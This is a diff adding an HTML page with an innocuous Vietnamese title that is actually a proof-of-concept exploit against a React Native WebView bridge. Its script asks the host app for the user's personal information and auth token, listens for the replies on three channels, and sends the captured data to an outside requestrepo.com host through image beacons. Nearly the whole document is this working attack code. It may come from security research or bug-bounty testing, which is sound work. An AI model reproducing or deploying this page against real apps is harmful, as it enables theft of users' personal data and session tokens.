@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head><title>Định danh địa điểm</title></head>
+<body>
+<h1 id="status">Đang tải...</h1>
+<pre id="result" style="white-space:pre-wrap;word-break:break-all;"></pre>
+<script>
+var resultEl = document.getElementById('result');
+var statusEl = document.getElementById('status');
+
+function log(msg) {
+  resultEl.textContent += msg + '\n';
+  console.log(msg);
+}
+
+// Listen for response FIRST, before sending
+function setupListeners() {
+  // Path 1: postMessage response
+  window.addEventListener('message', function(e) {
+    log('[message event] ' + JSON.stringify(e.data));
+    try {
+      var data = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
+      if (data.event === 'ON_USER_INFO' || data.event === 'ON_GET_USER_INFO') {
+        statusEl.textContent = 'GOT USER INFO!';
+        log('=== PII LEAKED ===');
+        log(JSON.stringify(data, null, 2));
+        // Exfil
+        var img = new Image();
+        img.src = 'http://9liv9n84.requestrepo.com/poc?d=' + encodeURIComponent(JSON.stringify(data));
+      }
+      if (data.event === 'ON_TOKEN' || data.event === 'ON_GET_TOKEN') {
+        log('=== TOKEN LEAKED ===');
+        log(JSON.stringify(data, null, 2));
+      }
+    } catch(ex) {
+      log('parse error: ' + ex.message);
+    }
+  });
+
+  // Path 2: CustomEvent (nativeMessage) — used by sendDataToWebView
+  window.addEventListener('nativeMessage', function(e) {
+    log('[nativeMessage event] ' + JSON.stringify(e.detail));
+    if (e.detail) {
+      statusEl.textContent = 'GOT NATIVE MESSAGE!';
+      var img = new Image();
+      img.src = 'http://9liv9n84.requestrepo.com/poc2?d=' + encodeURIComponent(JSON.stringify(e.detail));
+    }
+  });
+
+  // Path 3: handleNativeMessage global function — used by sendDataToWebView
+  window.handleNativeMessage = function(data) {
+    log('[handleNativeMessage] ' + JSON.stringify(data));
+    statusEl.textContent = 'GOT NATIVE MESSAGE (handler)!';
+    var img = new Image();
+    img.src = 'http://9liv9n84.requestrepo.com/poc3?d=' + encodeURIComponent(JSON.stringify(data));
+  };
+}
+
+setupListeners();
+
+// Wait for ReactNativeWebView to be injected, then send events
+function tryExploit() {
+  if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
+    log('ReactNativeWebView found! Sending GET_USER_INFO...');
+
+    // Request PII
+    window.ReactNativeWebView.postMessage(JSON.stringify({
+      event: "GET_USER_INFO",
+      data: {}
+    }));
+
+    // Also request token
+    setTimeout(function() {
+      log('Sending GET_TOKEN...');
+      window.ReactNativeWebView.postMessage(JSON.stringify({
+        event: "GET_TOKEN",
+        data: {}
+      }));
+    }, 500);
+
+    statusEl.textContent = 'Events sent, waiting for response...';
+  } else {
+    log('Waiting for ReactNativeWebView... (' + (Date.now()) + ')');
+    setTimeout(tryExploit, 200);
+  }
+}
+
+// Start polling after a small delay
+setTimeout(tryExploit, 300);
+</script>
+</body>
+</html>
